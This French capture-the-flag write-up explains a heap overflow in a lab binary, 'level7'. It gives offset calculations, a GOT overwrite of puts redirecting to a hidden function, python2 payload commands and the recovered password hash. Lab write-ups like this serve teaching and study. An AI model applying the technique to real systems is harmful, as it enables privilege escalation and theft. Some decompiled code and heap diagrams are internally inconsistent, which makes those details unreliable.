# LEVEL 7

## 1. Introduction

Le programme `level7` présente une vulnérabilité de **heap overflow** complexe avec **double exploitation** : deux `strcpy()` sans contrôle de taille permettent d'écraser des structures en heap et de modifier l'entrée GOT de `puts()` pour rediriger l'exécution vers une fonction cachée qui affiche le flag.

Le programme alloue deux petites structures sur le tas. Chaque structure contient un entier et un pointeur vers un tampon de 8 octets. Les arguments passés en ligne de commande sont copiés dans ces tampons avec `strcpy` sans contrôle de taille, ce qui permet un dépassement de tampon sur le tas.

## 2. Analyse

### 2.1 Droits du binaire
```bash
$ ls -la level7
-rwsr-s---+ 1 level8  level7  747441 Mar  6  2016 level7
```

### 2.2 Analyse avec Ghidra

En décompilant le binaire, on observe la structure suivante :

```c
// Fonction cible (adresse 0x080484f4)
void m(void *param_1, int param_2, char *param_3, int param_4, int param_5) {
    time_t tVar1;
    tVar1 = time((time_t *)0x0);
    printf("%s - %d\n", c, tVar1);  // ← Affiche le flag !
    return;
}

void main(undefined4 argc, int argv) {
    undefined4 *puVar1;
    void *pvVar2;
    undefined4 *puVar3;
    FILE *__stream;
    
    puVar1 = (undefined4 *)malloc(8);     // Structure A
    *puVar1 = 1;
    pvVar2 = malloc(8);                   // Buffer A
    puVar1[1] = pvVar2;
    
    puVar3 = (undefined4 *)malloc(8);     // Structure B
    *puVar3 = 2;
    pvVar2 = malloc(8);                   // Buffer B
    puVar3[1] = pvVar2;
    
    strcpy((char *)puVar1[1], *(char **)(av[1]));  // ← Vulnérabilité 1 !
    strcpy((char *)puVar2, *(char **)(av[2]));     // ← Vulnérabilité 2 !
    
    __stream = fopen("/home/user/level8/.pass", "r");
    fgets(c, 0x44, __stream);  // Charge le flag dans variable globale c
    puts("~~");                 // ← Cible à détourner !
    return 0;
}
```

**Points clés :**
- Deux `strcpy()` sans vérification de taille
- Structures en heap avec pointeurs vers buffers
- Variable globale `c` contient le flag
- Fonction `m()` affiche le flag (notre cible)
- `puts("~~")` en fin de programme (cible à détourner)

### 2.3 Fonction cible

La fonction `m()` (adresse `0x080484f4`) n'est jamais appelée dans `main`. Elle affiche la chaîne globale `c` – remplie avec le contenu du fichier `/home/user/level8/.pass` – suivie de l'heure courante :

```c
void m(void *param_1, int param_2, char *param_3, int param_4, int param_5) {
    time_t tVar1;
    tVar1 = time(NULL);
    printf("%s - %d\n", c, tVar1);  // ← Affiche le flag !
}
```

## 3. Exploitation

### 3.1 Étape 1 : Calcul de l'offset pour l'overflow

Le code réserve quatre chunks successifs de 8 octets chacun : deux pour les entiers + pointeurs (`puVar1` et `puVar3`), et deux pour les tampons de données. En mémoire, cela donne :

```
[ header A | data A (8) ]   ← puVar1
[ header B | data B (8) ]   ← puVar1[1]
[ header C | data C (8) ]   ← puVar3
[ header D | data D (8) ]   ← puVar3[1]
```

Pour atteindre et réécrire **`puVar3[1]`** (stocké dans `data C` à l'offset 4), il faut franchir :

1. **8 octets** : remplissage complet de `data B` (zone utilisateur du chunk B)
2. **8 octets** : en-tête du chunk C (métadonnées `malloc`)
3. **4 octets** : position de `puVar3[1]` dans la zone `data C`

Offset total = 8 + 8 + 4 = 20 octets

### 3.2 Étape 2 : GOT (Global Offset Table)

Lorsqu'un binaire appelle une fonction externe (comme `puts`), il passe d'abord par la **PLT** (Procedure Linkage Table), qui effectue un saut vers l'adresse stockée dans la **GOT** (Global Offset Table).

- **GOT[puts]** contient l'adresse effective de `puts` dans la libc.
- En écrasant cette case GOT (via le second `strcpy`), on peut rediriger tous les appels à `puts` vers **n'importe quelle** fonction.

### 3.3 Pourquoi viser l'entrée GOT de `puts` ?

Le code appelle `puts("~~")` en fin de `main`. En réécrivant l'entrée GOT de `puts` pour qu'elle contienne l'adresse de `m()`, cet appel exécutera `m()` et affichera la variable globale `c` (le flag).

On récupère l'adresse de l'entrée GOT de `puts` par :

```bash
objdump -d level7 | grep -A1 '<puts@plt>'
#    jmp   *0x08049928     ← adresse GOT de puts
```

**Adresse GOT de `puts` : `0x08049928`**

### 3.4 Étape 3 : Construction du payload

1. **`argv[1]`** : Overflow de **20 octets** + adresse GOT de `puts` (`0x08049928`) en little-endian.
2. **`argv[2]`** : Adresse de `m` (`0x080484f4`) en little-endian. Cette valeur sera copiée dans GOT[puts] par le second `strcpy`.
3. Lorsque `puts("~~")` est appelé, c'est en réalité `m()` qui s'exécute et affiche la variable `c`.

### 3.5 Commandes complètes

```bash
# Se connecter au niveau
ssh level7@<IP> -p 4242

# Créer les payloads
cd /tmp

# 1) Overflow : écraser puVar3[1] → entrée GOT de puts
echo -ne "$(python2 -c 'print "A"*20 + "\x28\x99\x04\x08"')" > payload1

# 2) Script pour l'adresse de m()
echo -ne "$(python2 -c 'print "\xf4\x84\x04\x08"')" > payload2

# 3) Exécution de l'exploit
./level7 $(cat payload1) $(cat payload2)
```

L'exécution affiche alors le contenu de `c`, c'est-à-dire le flag :

```bash
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

## 4. Structure du Payload

### 4.1 Ce qui se passe concrètement

```
┌─────────────────────────────────────────────────────────┐
│              DOUBLE HEAP OVERFLOW                      │
├─────────────────────────────────────────────────────────┤
│  Payload1[20] + Adresse GOT + Payload2[4]            │
│  │                                                    │
│  └─→ "A"*20 + "\x28\x99\x04\x08" + "\xf4\x84\x04\x08"│
│      │                                                │
│      └─→ strcpy() déborde buffer A → écrasement      │
│          │                                            │
│          └─→ puVar3[1] pointe vers GOT de puts      │
│              │                                        │
│              └─→ strcpy() écrit adresse de m()       │
│                  │                                    │
│                  └─→ GOT[puts] pointe vers m()       │
│                      │                               │
│                      └─→ puts("~~") appelle m()      │
│                          │                           │
│                          └─→ printf("%s - %d", c)   │
│                              │                       │
│                              └─→ Flag affiché        │
└─────────────────────────────────────────────────────────┘
```

### 4.2 Structure de la mémoire heap

```
┌─────────────────┐
│   Header A      │ ← Métadonnées malloc
├─────────────────┤
│   Data A (8)    │ ← Buffer A (notre payload1)
├─────────────────┤
│   Header B      │ ← Métadonnées malloc
├─────────────────┤
│   Data B (8)    │ ← Buffer B (notre payload2)
└─────────────────┘
```

### 4.3 Double exploitation

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Premier       │    │   Deuxième      │    │   Résultat      │
│   strcpy()      │    │   strcpy()      │    │   GOT Overwrite │
│   argv[1]       │───▶│   argv[2]       │───▶│   puts → m()    │
│   → puVar3[1]   │    │   → GOT[puts]   │    │                │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

### 4.4 Flux d'exécution

```
1. Programme alloue 4 chunks en heap (2 structures + 2 buffers)
2. Premier strcpy() copie argv[1] dans buffer A
3. Buffer A déborde et écrase puVar3[1] avec adresse GOT de puts
4. Deuxième strcpy() copie argv[2] (adresse de m()) dans GOT[puts]
5. puts("~~") est appelé en fin de programme
6. puts() pointe maintenant vers m() au lieu de la libc
7. m() s'exécute et affiche le flag avec printf("%s - %d", c)
```

### 4.5 Visualisation de l'exploitation

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Heap Overflow │    │   GOT Overwrite │    │   Redirection   │
│   argv[1]       │───▶│   argv[2]       │───▶│   puts → m()    │
│   20 bytes      │    │   Adresse m()   │    │                │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

### 4.6 Mécanisme de double exploitation

```
┌─────────────────┐
│ Payload1[20]    │ ← Premier strcpy() - overflow
├─────────────────┤
│ Adresse GOT     │ ← Écrasement de puVar3[1]
├─────────────────┤
│ Payload2[4]     │ ← Deuxième strcpy() - GOT overwrite
└─────────────────┘
```

## 5. Conclusion

Cette exploitation démontre l'importance de la protection des structures heap et l'utilisation de techniques de double exploitation pour rediriger l'exécution via la GOT. 